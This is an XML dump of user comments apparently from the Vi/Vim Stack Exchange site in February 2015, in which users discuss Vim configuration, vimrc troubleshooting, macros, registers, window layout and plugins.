  <row Id="1132" PostId="13" Score="0" Text="BTW, thank you very much the correct answers - if anybody would convert them to answer, I were happy to accept that." CreationDate="2015-02-17T09:15:35.060" UserId="28" />
  <row Id="1133" PostId="839" Score="1" Text="Similar question here: http://vim.1045645.n5.nabble.com/Reformat-multi-line-strings-along-with-string-delimiters-tt1190448.html#none" CreationDate="2015-02-17T10:30:22.523" UserId="91" />
  <row Id="1134" PostId="838" Score="1" Text="Downvoted because even with the edit, it's still pretty unclear what whitespace should or shouldn't be removed. Is the example the *only* type of space that is to be removed? If so, why does the first para say &quot;before tab and after tab&quot; characters, and why use the confusing term &quot;white spaces&quot; if the question is only referring to space characters?" CreationDate="2015-02-17T14:14:28.450" UserId="343" />
  <row Id="1135" PostId="870" Score="0" Text="`infercase` could also be set, I think. Ah, but it implies `ignorecase`." CreationDate="2015-02-17T14:20:58.877" UserId="356" />
  <row Id="1136" PostId="1873" Score="3" Text="I've never noticed this behaviour in Vim on any platform ... What happens if you start gVim like: `gvim -u NONE -U NONE` (you can either use cmd.exe, or make a  shortcut)? This will prevent loading your (g)vimrc files." CreationDate="2015-02-17T17:39:01.087" UserId="51" />
  <row Id="1138" PostId="1873" Score="1" Text="Is that your *complete* vimrc file? My first suspicion would be that an autocmd in your vimrc file is removing trailing whitespace. Does the behaviour change when you start gVim without any vimrc file (see above comment)?" CreationDate="2015-02-17T18:17:07.497" UserId="51" />
  <row Id="1139" PostId="1873" Score="0" Text="The above is not my complete .vimrc, there are other settings too. Running gVim without a .vimrc (:scriptnames shows no .vimrc or .gvimrc) solves my problem. You're absolutely right, I need to look through my .vimrc or something else that is sourced that might be causing this." CreationDate="2015-02-17T18:28:03.200" UserId="231" />
  <row Id="1140" PostId="1873" Score="0" Text="Apparently this elimination of whitespace-on-new-lines is a desirable behavior, I'm reading [here](http://stackoverflow.com/questions/24766031/vim-inserting-new-line-then-pressing-escape-moves-cursor-to-beginning-of-line) it's meant to keep the file clean of whitespace." CreationDate="2015-02-17T18:42:10.210" UserId="231" />
  <row Id="1141" PostId="1873" Score="0" Text="That's about opening new lines ... Not about writing to a file?" CreationDate="2015-02-17T19:05:19.627" UserId="51" />
  <row Id="1142" PostId="1873" Score="0" Text="@Carpetsmoker - True, however I was having my 'issue' here upon using the key sequence -esc-:w. I was thinking the _write action itself_ was at fault for moving the cursor to the far left. It turns out Vim's default behavior for handling unedited new lines is to move the cursor to the far left, when pressing -esc- to revert to normal mode from insert mode. So, it was really just the -esc- key press which was moving the cursor to the left. The write action was not at fault." CreationDate="2015-02-17T20:52:08.253" UserId="231" />
  <row Id="1143" PostId="1878" Score="0" Text="This is a definitive answer to my question from the original documentation. Thanks for the summary and narrative - I would not have thought to look into :h autoindent for this information. Thanks also @Carpetsmoker for discussion leading to a solution." CreationDate="2015-02-17T21:07:09.640" UserId="231" />
  <row Id="1145" PostId="1886" Score="0" Text="`realpath` isn't POSIX, so it might be simpler to do: `!echo &quot;$PWD/%&quot;`" CreationDate="2015-02-18T00:57:32.920" UserId="205" />
  <row Id="1146" PostId="1886" Score="0" Text="Agreed; good call." CreationDate="2015-02-18T01:07:27.817" UserId="520" />
  <row Id="1147" PostId="1884" Score="0" Text="I know that I can do this, but there are a couple of downsides. (1) If the window is the only view of a given buffer, and the buffer is dirty, you'll have to `:wq` or `:q!`, neither of which is desirable. (2) This will reset any window-specific settings, like the cursor position. (3) This will break any in-progress diffs. Essentially, windows are first-class citizens; destroying them and creating new ones simply isn't sufficient." CreationDate="2015-02-18T01:42:20.040" UserId="142" />
  <row Id="1148" PostId="1888" Score="0" Text="Actually, that's not a macro so much as it is a one liner, but you could map it to a key combination." CreationDate="2015-02-18T02:48:14.083" UserId="227" />
  <row Id="1149" PostId="1889" Score="2" Text="which vim (and patch level) are you using? (like vim --version output), and what OS? Regardless, it would be a good idea to update vim. If you're on a Mac and you use ruby plugins (like command-T), you might reinstall them and/or make sure vim is using system ruby and not rvm ruby (which seems to have caused troubles for some people)" CreationDate="2015-02-18T05:20:23.237" UserId="130" />
  <row Id="1150" PostId="1888" Score="0" Text="Added an operator version to do it. Operates a bit better." CreationDate="2015-02-18T05:52:25.683" UserId="227" />
  <row Id="1151" PostId="1891" Score="1" Text="If elflord sets `bg` to `dark`, why does its appearance change if I set it to `light` and back again? Note that my vimrc does not do `set bg=light`." CreationDate="2015-02-18T08:23:25.830" UserId="205" />
  <row Id="1152" PostId="1880" Score="0" Text="Karl, excellent, thank you! This also handles the input of the name a little more elegantly too, which is great, and it all seems to work, including the calling of the mapping." CreationDate="2015-02-18T08:31:30.157" UserId="91" />
  <row Id="1153" PostId="1880" Score="0" Text="No problem, I'm happy it works." CreationDate="2015-02-18T08:43:58.133" UserId="21" />
  <row Id="1154" PostId="1882" Score="0" Text="To me it seems that `:set iskeyword+={,},,,(,),^` works as expected." CreationDate="2015-02-18T08:54:06.517" UserId="21" />
  <row Id="1155" PostId="1891" Score="0" Text="`set bg` changes the colors and attributes of some highlight groups so that they work better on dark or light background. It is mostly arbitrary and may or may not have an effect depending on the colorscheme you use. Messing with that option is not a good idea." CreationDate="2015-02-18T09:20:47.023" UserId="54" />
  <row Id="1156" PostId="1891" Score="0" Text="I followed your advice on `bg` and `t_Co`. I'm just wondering why elflord's `set bg=dark` and mine cause such differing (yet repeatable) results?" CreationDate="2015-02-18T09:24:30.450" UserId="205" />
  <row Id="1157" PostId="1891" Score="2" Text="It's the order in which they are applied. Because one is not the exact opposite of the other switching multiple times between &quot;dark&quot; and &quot;light&quot; is not a toggle between two definite and stable states." CreationDate="2015-02-18T09:33:11.340" UserId="54" />
  <row Id="1158" PostId="1889" Score="1" Text="You can start vim as `vim -u NONE -p first.txt second.txt` ... This will prevent loading your vimrc file." CreationDate="2015-02-18T10:47:22.803" UserId="51" />
  <row Id="1159" PostId="1874" Score="1" Text="I'm a bit unclear as to what you're trying to achieve when you press &lt;C-W&gt;J, which moves &quot;the current window to be at the very bottom, using the full width of the screen,&quot; This means the windows will no longer be in a grid formation, by definition. What are you trying to actually do with your windows?" CreationDate="2015-02-18T11:26:59.127" UserId="343" />
  <row Id="1161" PostId="1893" Score="0" Text="It's unnecessary to clear out the `q` register, as `qq` does just that before it starts recording keystrokes. In fact, that's precisely why `qqq` works to clear the `q` register :)" CreationDate="2015-02-18T12:13:10.653" UserId="64" />
  <row Id="1163" PostId="1893" Score="0" Text="Of course, if you were doing something that required *appending* to the `q` register (i.e. using `qQ`) then clearing it first would probably be necessary." CreationDate="2015-02-18T12:15:20.827" UserId="64" />
  <row Id="1165" PostId="1888" Score="0" Text="I think it's okay if your answer doesn't specifically use a macro; the asker presented [an XY problem](http://xyproblem.info/), in my opinion." CreationDate="2015-02-18T12:18:10.827" UserId="64" />
  <row Id="1166" PostId="1893" Score="2" Text="@tommcdo That's definitely not true in my copy of Vim. (Vim 7.3.87, invoked with `vim -u NONE`). The existing contents are only cleared out when you *save* the register, in step 6. Clearing out the register before you start is therefore necessary if you want to recurse." CreationDate="2015-02-18T12:19:38.957" UserId="343" />
  <row Id="1167" PostId="1893" Score="0" Text="@tommcdo I've updated the answer to make it more clear why this step is necessary." CreationDate="2015-02-18T12:22:28.807" UserId="343" />
  <row Id="1168" PostId="1889" Score="0" Text="@hatter The vim was installed or compiled? Can you upgrade it to 7.4 and see if that helps." CreationDate="2015-02-18T13:04:31.633" UserId="467" />
  <row Id="1169" PostId="1889" Score="0" Text="@kenorb Vim was installed." CreationDate="2015-02-18T14:49:55.823" UserId="534" />
  <row Id="1170" PostId="1889" Score="0" Text="@Carpetsmoker It worked!! Does this definitively point that there is a problem in `.vimrc` file?" CreationDate="2015-02-18T14:50:58.770" UserId="534" />
  <row Id="1171" PostId="1889" Score="0" Text="@hatter It would seem so; perhaps this problem is only triggered if a certain section is enabled, or perhaps a certain plugin ... you could try to comment out lines (or blocks of lines), see if the problem still occurs, and repeat until it doesn't ... That way you can find out where the problem is..." CreationDate="2015-02-18T15:04:22.300" UserId="51" />
  <row Id="1172" PostId="1898" Score="1" Text="Thanks, but you've to check the command history every time manually, but I'm looking for some method of displaying them on the screen automatically." CreationDate="2015-02-18T15:26:53.133" UserId="467" />
  <row Id="1174" PostId="1894" Score="0" Text="Related: [Showing command history with showcmd](http://vi.stackexchange.com/questions/742/showing-command-history-with-showcmd), but I wouldn't like to modify the vim sources." CreationDate="2015-02-18T15:32:58.907" UserId="467" />
  <row Id="1176" PostId="1894" Score="1" Text="This is just the same question? There is one answer, which states that it's not possible without editing the source; perhaps more answers are possible (doubt it)" CreationDate="2015-02-18T15:34:00.707" UserId="51" />
  <row Id="1177" PostId="1894" Score="1" Text="I've tried to use `:set showcmd`, but it doesn't show keystrokes like `w`, `b`, `j`, etc." CreationDate="2015-02-18T15:36:02.360" UserId="467" />
  <row Id="1178" PostId="1894" Score="1" Text="Related: [Vim plugin that explains commands as you type them](https://softwarerecs.stackexchange.com/questions/7326/vim-plugin-that-explains-commands-as-you-type-them) at softwarerecs SE" CreationDate="2015-02-18T15:37:01.543" UserId="467" />
  <row Id="1179" PostId="742" Score="0" Text="Related: [Vim plugin that explains commands as you type them](https://softwarerecs.stackexchange.com/questions/7326/vim-plugin-that-explains-commands-as-you-type-them) at softwarerecs SE" CreationDate="2015-02-18T15:39:20.507" UserId="467" />
  <row Id="1180" PostId="1889" Score="0" Text="@Carpetsmoker please see the edited question." CreationDate="2015-02-18T15:41:38.097" UserId="534" />
  <row Id="1181" PostId="1894" Score="0" Text="It looks like the same question as [Showing command history with showcmd](http://vi.stackexchange.com/questions/742/showing-command-history-with-showcmd), the title wasn't so obvious, however editing vim sources doesn't look like a good idea." CreationDate="2015-02-18T15:43:52.323" UserId="467" />
  <row Id="1182" PostId="1894" Score="0" Text="No, but (what you consider to be) a bad answer is not a reason to ask the same question again just a few days later :-) Maybe if the other question was a 5-year old outdated question, but that's obviously not the case..." CreationDate="2015-02-18T15:49:08.983" UserId="51" />
  <row Id="1183" PostId="1894" Score="0" Text="@Carpetsmoker Most of the original questions usually have very low quality question titles, so it's almost impossible to find the right answer which you're looking for. I hope this duplicate will find locating the right question." CreationDate="2015-02-18T15:50:59.257" UserId="467" />
  <row Id="1185" PostId="1884" Score="0" Text="@WChargin Some of that goes away if you set vim to allow hidden buffers. But yeah..." CreationDate="2015-02-18T16:54:20.020" UserId="31" />
  <row Id="1186" PostId="1896" Score="1" Text="`set columns=90` will resize a gvim, but unfortunately that's the total width, not the width of the displayed text. So you'd have to use 84+ with numbers on." CreationDate="2015-02-18T17:03:36.513" UserId="31" />
  <row Id="1187" PostId="1874" Score="3" Text="@Rich I think OP is just exemplifying a situation after which he may want to reset the windows to grid formation." CreationDate="2015-02-18T18:12:14.483" UserId="356" />
  <row Id="1188" PostId="1874" Score="0" Text="@GonçaloRibeiro Correct." CreationDate="2015-02-18T18:16:29.803" UserId="142" />
  <row Id="1189" PostId="1896" Score="1" Text="Are you talking about (internal) Vim-windows, or the Terminal itself, or both?" CreationDate="2015-02-18T18:18:31.423" UserId="220" />
  <row Id="1190" PostId="1904" Score="0" Text="You're not using GVim, right? In GVim I just tried this and the numbers are not selected." CreationDate="2015-02-18T20:15:32.533" UserId="356" />
  <row Id="1191" PostId="1904" Score="0" Text="nope. using vim in a virtual terminal" CreationDate="2015-02-18T20:16:33.597" UserId="496" />
  <row Id="1192" PostId="838" Score="0" Text="@stdcall: You mean spaces just after tabs (3rd line)? Or spaces in the middle of line (between `int` and `a`/`b`)?" CreationDate="2015-02-18T20:16:42.700" UserId="467" />
  <row Id="1193" PostId="838" Score="0" Text="@kenorb Yes. after tabs (line 3)" CreationDate="2015-02-18T20:17:53.817" UserId="496" />
  <row Id="1194" PostId="1904" Score="2" Text="`:set mouse=a` should solve your problem." CreationDate="2015-02-18T20:21:39.463" UserId="54" />
  <row Id="1196" PostId="1889" Score="0" Text="@hatter You should dump the core file and check the backtrace with `gdb` what exactly is happening. If no symbols are visible, then probably you need to install vim with debug symbols or re-compile it." CreationDate="2015-02-18T21:11:38.830" UserId="467" />
  <row Id="1198" PostId="1902" Score="0" Text="While this link may answer the question, it is better to include the essential parts of the answer here and provide the link for reference.  Link-only answers can become invalid if the linked page changes." CreationDate="2015-02-18T21:42:09.013" UserId="205" />
  <row Id="1199" PostId="1902" Score="0" Text="Why the downvote?" CreationDate="2015-02-18T21:51:38.327" UserId="532" />
  <row Id="1200" PostId="241" Score="0" Text="Is this question considered a duplicate if it's on another stackexchange site?  http://stackoverflow.com/q/13194428/1698426" CreationDate="2015-02-18T21:55:28.237" UserId="532" />
  <row Id="1201" PostId="1902" Score="0" Text="Not me. Probably whoever flagged it." CreationDate="2015-02-18T21:59:42.000" UserId="205" />
  <row Id="1202" PostId="1902" Score="0" Text="copy-and-paste from SO isn't much more useful than linking" CreationDate="2015-02-18T23:30:24.843" UserId="67" />
  <row Id="1203" PostId="301" Score="1" Text="I kinda like have `jk`/`kj` exit normal mode even in Dvorak; they're the &quot;c&quot; and &quot;v&quot; keys on a QWERTY keyboard, so they're easy for my left pointer and middle fingers." CreationDate="2015-02-18T23:33:58.677" UserId="67" />
  <row Id="1205" PostId="1902" Score="0" Text="I agree.  What would be the most useful thing I could do?" CreationDate="2015-02-18T23:44:21.457" UserId="532" />
  <row Id="1207" PostId="349" Score="0" Text="FWIW KeyRemap4MacBook has been renamed Karabiner: https://pqrs.org/osx/karabiner/index.html.en" CreationDate="2015-02-19T00:00:47.707" UserId="67" />
  <row Id="1208" PostId="1908" Score="0" Text="Wait a second... So I wrote this question before testing it, and it looks like the spell check ALREADY marks &quot;the the&quot; as a &quot;spelling&quot; error. Mind blown. Question still remains, though. How to add to this list?" CreationDate="2015-02-19T01:36:54.047" UserId="390" />
  <row Id="1209" PostId="1893" Score="0" Text="My mistake, I sort of jumped the gun there. Excellent clarification!" CreationDate="2015-02-19T01:41:58.697" UserId="64" />
  <row Id="1210" PostId="1908" Score="0" Text="`:help spell-BAD`" CreationDate="2015-02-19T01:51:18.463" UserId="88" />
  <row Id="1211" PostId="1884" Score="1" Text="Instead of closing the window and splitting the buffer to the desired location, split a new window where you want it to go, exchange it with the window you want to move, then close the (moved) new window." CreationDate="2015-02-19T02:02:32.970" UserId="64" />
  <row Id="1212" PostId="1888" Score="0" Text="@tommcdo Yes, you're right; it doesn't have to be an actual macro. It just needs to be some kind of automated method." CreationDate="2015-02-19T02:18:12.017" UserId="88" />
  <row Id="1213" PostId="1911" Score="0" Text="Describing the current workflow is more a comment than an answer. Though you do explain it well." CreationDate="2015-02-19T03:55:57.123" UserId="360" />
  <row Id="1214" PostId="1911" Score="0" Text="Usually yes I can buy that. However, I'd argue that in this case a change in workflow is the answer. Meh semantics I guess." CreationDate="2015-02-19T03:59:17.513" UserId="544" />
  <row Id="1215" PostId="1911" Score="0" Text="But is isn't a change in workflow. That is my current work flow. I can't imagine another workflow that would do this.&#xA;(ok full disclosure `ciw` is new to me, but not exactly game changing)" CreationDate="2015-02-19T04:01:45.750" UserId="360" />
  <row Id="1216" PostId="1883" Score="2" Text="FYI: `Ctrl+r` is for inserting registries (including the expression `=` reg). If you want to temporarily execute a one off command use `Ctrl+o`." CreationDate="2015-02-19T04:08:11.033" UserId="544" />
  <row Id="1217" PostId="1911" Score="0" Text="@Oxinabox perhaps you looking for something more on the lines of: http://www.vim.org/scripts/script.php?script_id=4929 maybe?" CreationDate="2015-02-19T04:12:36.573" UserId="544" />
  <row Id="1218" PostId="1911" Score="0" Text="Yes, that is much more like what I am looking for." CreationDate="2015-02-19T04:14:57.270" UserId="360" />
  <row Id="1219" PostId="584" Score="0" Text="Don't forget that while in the middle of editing a command you can bring up current line in the history editor and use vi to edit the line by pressing `Ctrl+f`" CreationDate="2015-02-19T04:20:25.793" UserId="544" />
  <row Id="1220" PostId="1900" Score="0" Text="There are 2 difficult problems in computer science: 1) cache invalidation, 2) naming things and 3) off by 1 errors" CreationDate="2015-02-19T05:14:39.943" UserId="19" />
  <row Id="1221" PostId="1899" Score="0" Text="I am using Vim 7.4. Official website says this is the latest version." CreationDate="2015-02-19T05:28:43.873" UserId="534" />
  <row Id="1222" PostId="255" Score="1" Text="This plugin was slow for me for some reason when zooming out. Anyone else having the same issue?" CreationDate="2015-02-19T05:42:07.273" UserId="571" />
  <row Id="1223" PostId="1899" Score="0" Text="@hatter you have fewer patches applied than are available." CreationDate="2015-02-19T05:45:08.557" UserId="31" />
  <row Id="1226" PostId="839" Score="3" Text="Have you also considered rewriting the code as a [`&quot;&quot;&quot;multi-line string&quot;&quot;&quot;`](https://docs.python.org/3/reference/lexical_analysis.html#grammar-token-longstring)?" CreationDate="2015-02-19T07:18:46.990" UserId="24" />
  <row Id="1227" PostId="1922" Score="2" Text="I don't know the answer, but I know that `:substitute` operatores on a line by line basis, which explains what you are seeing in your example." CreationDate="2015-02-19T08:03:12.563" UserId="21" />
  <row Id="1229" PostId="1918" Score="5" Text="Alternatively, you can use `dap` to delete a paragraph, `da(`, `da{`, `da[`, to delete blocks delimeted by parentheses, braces, or square brackets. For html there is `dat`, which deletes a tag, and `da'` and `da&quot;` delete strings. There is also the `dip`, `di(`, etc variants, that will delete everything inside the delimiters, but leave the delimiters intact. Alternatively, you can use `vap` (resp `vip`) to select all (resp inner) paragraph. (And so there is `va(` and `vi(`.) Further there is `cap` and `cip` (or `ca(` and `ci(`) to delete and go to insert mode (i.e., &quot;change&quot;). And `yap` to yank" CreationDate="2015-02-19T08:12:49.350" UserId="111" />
  <row Id="1230" PostId="1916" Score="6" Text="Might as well use visual mode for this, right?" CreationDate="2015-02-19T08:14:16.827" UserId="111" />
  <row Id="1231" PostId="1929" Score="1" Text="How does this answer the question?" CreationDate="2015-02-19T08:39:48.750" UserId="205" />
  <row Id="1232" PostId="1929" Score="0" Text="It takes the output of the command and puts it into vim." CreationDate="2015-02-19T08:43:37.267" UserId="593" />
  <row Id="1233" PostId="1893" Score="0" Text="@tommcdo Well, I think the answer's better now than it was before, so I'm glad you did!" CreationDate="2015-02-19T08:45:34.110" UserId="343" />
  <row Id="1234" PostId="1925" Score="0" Text="Accepting for the `d2j` which solves the problem." CreationDate="2015-02-19T08:49:47.103" UserId="579" />
  <row Id="1235" PostId="1916" Score="3" Text="That's _one_ way, jmc, but I'm not sure _standard_ vi has a visual mode." CreationDate="2015-02-19T08:52:17.947" UserId="579" />
  <row Id="1236" PostId="1928" Score="2" Text="Can you elaborate on what is `single-normal-mode-key`? You mean Escape?" CreationDate="2015-02-19T09:10:01.983" UserId="467" />
  <row Id="1237" PostId="1928" Score="0" Text="A single key press that you would use in normal mode can be used in insert mode with the alt key.  e.g. Alt+x to delete a character." CreationDate="2015-02-19T09:21:08.293" UserId="593" />
  <row Id="1238" PostId="839" Score="1" Text="@200_success, that's a great tip, thanks. I didn't know about that feature of Python at all. It seems to work, mostly - although all parameters to the function are reflowed, which isn't ideal. I think my question is still valid for the type of string I have though, and certainly for other langs." CreationDate="2015-02-19T09:40:07.843" UserId="91" />
  <row Id="1239" PostId="1928" Score="2" Text="I don't quite understand this answer either; Alt+x actually seems to do something different than Alt in normal mode? And some other keys don't seem to work? But maybe I'm using it wrong..? Maybe you could expand on your answer a little bit to explain how it works, and link to some Vim docs would also be good :-) Thanks! :-)" CreationDate="2015-02-19T09:52:39.377" UserId="51" />
  <row Id="1240" PostId="161" Score="0" Text="I don't understand why you use a macro for single command, when you can do `:9,22 normal I#` as per my answer." CreationDate="2015-02-19T09:53:54.853" UserId="612" />
  <row Id="1241" PostId="1935" Score="0" Text="Thanks for your answer! Could you perhaps expand it? Providing plugin-answers is fine, but right now it's just s a link to a plugin. At the very least, a basic description of what it does and how to use it is expected in the answer. [also see this meta post](http://meta.vi.stackexchange.com/a/102/51)." CreationDate="2015-02-19T10:09:40.390" UserId="51" />
  <row Id="1242" PostId="146" Score="0" Text="0 is not needed since by default, `normal` command is executed with cursor at start of the line." CreationDate="2015-02-19T10:28:12.263" UserId="534" />
  <row Id="1244" PostId="1889" Score="0" Text="@kenorb Vim doesn't write to a core file. When this problem occurs, I kill the terminal. I think this closes Vim before it can write to the core file." CreationDate="2015-02-19T10:40:15.413" UserId="534" />
  <row Id="1245" PostId="1912" Score="3" Text="Are you using the html filetype, as the question tag suggests? If so, the short answer is that Vim's included html syntax file doesn't support ejs files, and you'll need to find or write one that does. You could try [this one](https://github.com/nikvdp/ejs-syntax)." CreationDate="2015-02-19T10:48:36.773" UserId="343" />
  <row Id="1246" PostId="1889" Score="0" Text="@hatter All programs normally write to core file on SEGV, but sometimes these needs to be enabled depending on the OS. If it's Linux, [see](http://unix.stackexchange.com/q/31187/21471)." CreationDate="2015-02-19T10:50:38.437" UserId="467" />
  <row Id="1247" PostId="1941" Score="0" Text="But this means you still need to count the lines ...? Or did I misunderstand your answer?" CreationDate="2015-02-19T10:51:08.267" UserId="51" />
  <row Id="1248" PostId="1916" Score="0" Text="— I definitely agree with you that this is a viable approach in vi. But as the question only mentions vim, it seems rather strange (incomplete) not to mention visual mode in your answer." CreationDate="2015-02-19T10:55:16.580" UserId="111" />
  <row Id="1249" PostId="1941" Score="6" Text="You don't need to count the lines, but you do need to know the line numbers." CreationDate="2015-02-19T10:55:54.417" UserId="111" />
  <row Id="1250" PostId="1899" Score="0" Text="He's running Debian, so that explains that :-)" CreationDate="2015-02-19T10:57:13.467" UserId="51" />
  <row Id="1251" PostId="1947" Score="2" Text="This is also the first thing that I tried when I saw the question :-) But if you use a command that outputs to stdout (or stderr), it will &quot;clobber&quot; your main Vim window (try `:silent !ls`) ... It also doesn't give proper output on a non-0 exit code... So I'm afraid it's a bit more involved than just using `:silent`..." CreationDate="2015-02-19T11:07:08.283" UserId="51" />
  <row Id="1252" PostId="1947" Score="0" Text="Oh, sorry. Added some notes about asynchronous execution while you wrote your comment. Don't know how to address the exit status issue. You might want to try in #vim on Freenode." CreationDate="2015-02-19T11:11:35.840" UserId="628" />
  <row Id="1253" PostId="1947" Score="0" Text="I also want to note that neither `:silent exec &quot;!ls&quot;` nor `:silent !ls` show any output at all on my version of Vim, 7.4 with patches 1-213." CreationDate="2015-02-19T11:14:38.977" UserId="628" />
  <row Id="1254" PostId="1942" Score="1" Text="Would you be willing to use the +python interface, or one of the other language interfaces?" CreationDate="2015-02-19T11:17:15.967" UserId="630" />
  <row Id="1255" PostId="1942" Score="1" Text="@joeytwiddle Yes" CreationDate="2015-02-19T11:33:53.767" UserId="153" />
  <row Id="1256" PostId="1947" Score="1" Text="Hm, here's what I get after `:silent !ls`:  http://i.stack.imgur.com/1XvS6.png ... I need to press `^L` to fix it again ..." CreationDate="2015-02-19T11:35:22.573" UserId="51" />
  <row Id="1257" PostId="1947" Score="0" Text="vim-dispatch certainly looks like a solution to the given problem." CreationDate="2015-02-19T11:56:05.217" UserId="630" />
  <row Id="1258" PostId="1896" Score="0" Text="I'm talking about both. If the Vim window needs to be larger than the terminal width, I'd like the terminal to expand.  Perhaps this isn't possible within vim..." CreationDate="2015-02-19T11:57:30.503" UserId="69" />
  <row Id="1259" PostId="1874" Score="0" Text="Related: [How to change the current split's width and height?](http://vi.stackexchange.com/q/514/467), [How to convert all windows into horizontal, vertical or tab splits?](http://vi.stackexchange.com/q/758/467)" CreationDate="2015-02-19T11:58:26.133" UserId="467" />
  <row Id="1260" PostId="1914" Score="1" Text="I know this doesn't answer your question, but your choice of string formatting is usually discouraged in javascript. See http://google-styleguide.googlecode.com/svn/trunk/javascriptguide.xml?showone=Multiline_string_literals#Multiline_string_literals for reference and a way to avoid this problem." CreationDate="2015-02-19T12:28:28.473" UserId="642" />
  <row Id="1261" PostId="1957" Score="0" Text="This seems to be the same as [Khelben's answer of Feb 8](http://vi.stackexchange.com/a/612/51)?" CreationDate="2015-02-19T12:29:36.940" UserId="51" />
  <row Id="1262" PostId="770" Score="0" Text="Doesn't work. I added it to my .bashrc and I don't get it in my clipboard. I'm using Ubuntu 14.04" CreationDate="2015-02-19T12:55:01.720" UserId="496" />
  <row Id="1263" PostId="1950" Score="1" Text="This happens only on my system. Doesn't happen with `-u NONE`. Seems the line `set columns=1000` in `.vimrc` is the culprit." CreationDate="2015-02-19T13:22:52.950" UserId="534" />
  <row Id="1265" PostId="1960" Score="1" Text="This question is very unclear. What is a &quot;syntax highlighting library&quot;? Do you have a specific library you want to use? And how do you want to &quot;integrate&quot; with it (ie. what do you wnat it to do)? As far as I know, `ctags` has nothing to do with syntax highlighting..." CreationDate="2015-02-19T14:01:12.613" UserId="51" />
  <row Id="1267" PostId="1960" Score="0" Text="@Carpetsmoker You have right, I seriously misunderstood something! I repaired my question, maybe it were enough to a VtC removal?" CreationDate="2015-02-19T14:05:17.663" UserId="28" />
  <row Id="1268" PostId="1916" Score="4" Text="Since I moved from visual selection to marking and relative line numbers about a year ago I found that vi motion commands are much faster and efficient then visual selection. Even though the later is *easier* every time I hit the `v` key I ask myself do I really need it or is there a better motion way?" CreationDate="2015-02-19T14:21:50.657" UserId="544" />
  <row Id="1271" PostId="1960" Score="0" Text="You're still not really describing *what you want to do*. What does Vim do now? What do you *want it to do*?" CreationDate="2015-02-19T14:48:00.833" UserId="51" />
  <row Id="1274" PostId="1960" Score="0" Text="@Carpetsmoker I extended my question with the answer, maybe it is now understandable?" CreationDate="2015-02-19T14:57:04.003" UserId="28" />
  <row Id="1277" PostId="1960" Score="2" Text="I've edited the question to what I *think* you mean... It's still not entirly clear *why* you would want to do this btw (XY-problem?)" CreationDate="2015-02-19T15:06:54.823" UserId="51" />
  <row Id="1281" PostId="1959" Score="0" Text="At first I thought this answer was a bit off topic but then I installed the plugin and I have to say it's a game changer for me. I used to swap manually and the extra mental step meant that I shyed away from using those motions. Thank you!" CreationDate="2015-02-19T15:16:13.860" UserId="544" />
  <row Id="1282" PostId="146" Score="0" Text="@hatter Cool, thanks. I'll add that in." CreationDate="2015-02-19T15:16:36.407" UserId="142" />
  <row Id="1289" PostId="1971" Score="2" Text="No, this is not possible. The output if `:!` is shown in the command line, of which there is only one, and can only be at the bottom of the screen. The best I can think of is creating a new buffer/:split underneath the current one..." CreationDate="2015-02-19T15:43:01.260" UserId="51" />
  <row Id="1290" PostId="1971" Score="0" Text="@Carpetsmoker, For me, the output of `:!` does not go to the command line. Instead the vim session disappears and the entire terminal window shows the terminal output, including what was printed before `vim` was invoked." CreationDate="2015-02-19T15:47:00.627" UserId="69" />
  <row Id="1291" PostId="1971" Score="1" Text="Maybe that's due to the terminal you use and/or the `TERM` setting?" CreationDate="2015-02-19T15:49:05.297" UserId="51" />
  <row Id="1295" PostId="1973" Score="0" Text="possible duplicate of [How to convert all windows into horizontal, vertical or tab splits?](http://vi.stackexchange.com/questions/758/how-to-convert-all-windows-into-horizontal-vertical-or-tab-splits)" CreationDate="2015-02-19T15:59:10.573" UserId="467" />
  <row Id="1299" PostId="1985" Score="1" Text="Confirmed. Also, it's answered here: http://stackoverflow.com/questions/16030639/vim-formatoptions-or" CreationDate="2015-02-19T16:48:18.520" UserId="245" />
  <row Id="1300" PostId="1899" Score="0" Text="@Carpetsmoker I'm running Debian and have through patch 488... I'm not sure why OP has older. Wheezy (current release) has 7.3, so OP isn't using that. Unstable, Jessie, and Wheezy-Backports all have 7.4 patch 488. (Given, 640 is current, so that's still somewhat old.)" CreationDate="2015-02-19T16:50:39.173" UserId="31" />
  <row Id="1301" PostId="1984" Score="0" Text="Does this happen in other text-editors?" CreationDate="2015-02-19T16:51:37.840" UserId="245" />
  <row Id="1302" PostId="1912" Score="0" Text="I was using the html filetype. I just tried that plugin, and now vim highlights in red the outer closing bracket (`&gt;`) instead of the inner one." CreationDate="2015-02-19T16:51:54.117" UserId="178" />
  <row Id="1303" PostId="1914" Score="0" Text="Yeah my main reason for this format was that I'm not very good at SQL, so when I run into issues I copy and paste the SQL into a MySQL client to test things, and then when I've figured it out I put it back in my project. I found this syntax the easiest to convert to a single line of SQL." CreationDate="2015-02-19T16:53:58.863" UserId="178" />
  <row Id="1304" PostId="1981" Score="2" Text="I don't know of anything off the top of my head, but if you do this a lot, why not create a mapping/command?" CreationDate="2015-02-19T16:55:17.240" UserId="680" />
  <row Id="1305" PostId="1984" Score="0" Text="This is pasting into a terminal? `:set paste`. See also http://vi.stackexchange.com/questions/328/set-the-paste-option-but-for-one-insertion-only and http://vi.stackexchange.com/questions/730/how-can-i-copy-paste-new-text-without-auto-indentation-at-every-new-line." CreationDate="2015-02-19T16:57:03.403" UserId="31" />
  <row Id="1306" PostId="1981" Score="0" Text="@MattBoehm yeah, as I said, I just want to make sure there _really_ isn't something I missed out. I don't want to reinvent the wheel." CreationDate="2015-02-19T16:58:57.250" UserId="682" />
  <row Id="1307" PostId="390" Score="0" Text="My personal experience is that `Pathogen` is the worst choice you have among so many good alternatives. If you manage your bundles as git submodules then you often have to deal with lots of updates that are irrelevant to the changes you make, which is quite messy.  The other choices are just as minimal, from the user's perspective, let alone easier to use, as most of them manages bundles for you.  Currently my preferred choice is `vim-plug`." CreationDate="2015-02-19T17:03:09.883" UserId="332" />
  <row Id="1308" PostId="1987" Score="1" Text="I actually changed it permanently with the solution described at http://vi.stackexchange.com/a/1985/178, but this also works and is better suited for this particular problem." CreationDate="2015-02-19T17:06:29.607" UserId="178" />
  <row Id="1309" PostId="1935" Score="0" Text="Seems silly to copy/paste keybinds but there you go; I already described what it does." CreationDate="2015-02-19T17:07:15.070" UserId="609" />
  <row Id="1310" PostId="1912" Score="0" Text="Would you recommend just finding another plugin?" CreationDate="2015-02-19T17:09:02.427" UserId="178" />
  <row Id="1311" PostId="161" Score="0" Text="Why would you use :1&lt;enter&gt; when you can use gg?" CreationDate="2015-02-19T17:12:17.010" UserId="712" />
